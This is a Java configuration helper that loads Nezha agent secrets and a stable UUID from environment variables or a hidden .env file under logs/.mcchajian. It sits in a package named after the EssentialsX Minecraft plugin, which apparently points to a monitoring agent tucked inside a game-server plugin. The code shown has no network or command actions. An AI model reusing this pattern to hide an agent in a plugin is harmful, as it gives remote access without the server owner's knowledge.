package com.example.essentialsx;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.PosixFilePermission;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

final class RuntimeConfig {
    static final Path ENV_FILE = Path.of("logs", ".mcchajian", ".env");
    private RuntimeConfig() {}

    static Map<String, String> readEnvFile() throws IOException {
        Map<String, String> values = new HashMap<>();
        if (!Files.exists(ENV_FILE)) return values;
        for (String line : Files.readAllLines(ENV_FILE, StandardCharsets.UTF_8)) {
            String trimmed = line.trim();
            if (trimmed.isEmpty() || trimmed.startsWith("#")) continue;
            if (trimmed.startsWith("export ")) trimmed = trimmed.substring(7).trim();
            int equals = trimmed.indexOf('=');
            if (equals <= 0) continue;
            String key = trimmed.substring(0, equals).trim();
            String value = trimmed.substring(equals + 1).trim();
            if (value.length() >= 2 && ((value.startsWith("\"") && value.endsWith("\""))
                    || (value.startsWith("'") && value.endsWith("'")))) {
                value = value.substring(1, value.length() - 1);
            }
            values.put(key, value);
        }
        return values;
    }

    /** Process environment takes precedence over the private .env file. */
    static String value(Map<String, String> file, String fallback, String... names) {
        for (String name : names) {
            String value = System.getenv(name);
            if (value != null && !value.isBlank()) return value.trim();
        }
        for (String name : names) {
            String value = file.get(name);
            if (value != null && !value.isBlank()) return value.trim();
        }
        return fallback;
    }

    static boolean secretComesFromFile(Map<String, String> file) {
        for (String name : new String[]{"NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET"}) {
            String env = System.getenv(name);
            if (env != null && !env.isBlank()) return false;
        }
        for (String name : new String[]{"NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET"}) {
            String value = file.get(name);
            if (value != null && !value.isBlank()) return true;
        }
        return false;
    }

    static boolean envFileIsPrivate() {
        try {
            Set<PosixFilePermission> permissions = Files.getPosixFilePermissions(ENV_FILE);
            return !permissions.contains(PosixFilePermission.GROUP_READ)
                    && !permissions.contains(PosixFilePermission.GROUP_WRITE)
                    && !permissions.contains(PosixFilePermission.OTHERS_READ)
                    && !permissions.contains(PosixFilePermission.OTHERS_WRITE);
        } catch (IOException | UnsupportedOperationException | SecurityException error) {
            return false;
        }
    }

    static String stableUuid(Map<String, String> file) throws IOException {
        String configured = value(file, "", "NEZHA_UUID", "NZ_UUID");
        if (!configured.isEmpty()) return canonicalUuid(configured);
        Path directory = Path.of("logs", ".mcchajian", ".runtime");
        Files.createDirectories(directory);
        Path filePath = directory.resolve("ceshisonz-nezha.uuid");
        if (Files.exists(filePath, LinkOption.NOFOLLOW_LINKS)) {
            if (!Files.isRegularFile(filePath, LinkOption.NOFOLLOW_LINKS)) {
                throw new IOException("Nezha UUID path is not a regular file");
            }
            return canonicalUuid(Files.readString(filePath, StandardCharsets.UTF_8).trim());
        }
        String generated = UUID.randomUUID().toString();
        try {
            Files.writeString(filePath, generated + "\n", StandardCharsets.UTF_8,
                    StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE);
            return generated;
        } catch (FileAlreadyExistsException race) {
            if (!Files.isRegularFile(filePath, LinkOption.NOFOLLOW_LINKS)) throw new IOException("Invalid UUID path");
            return canonicalUuid(Files.readString(filePath, StandardCharsets.UTF_8).trim());
        }
    }

    private static String canonicalUuid(String value) throws IOException {
        try {
            String canonical = UUID.fromString(value).toString();
            if (!canonical.equalsIgnoreCase(value)) throw new IllegalArgumentException("Not a canonical UUID");
            return canonical;
        } catch (IllegalArgumentException error) {
            throw new IOException("Invalid Nezha UUID");
        }
    }
}
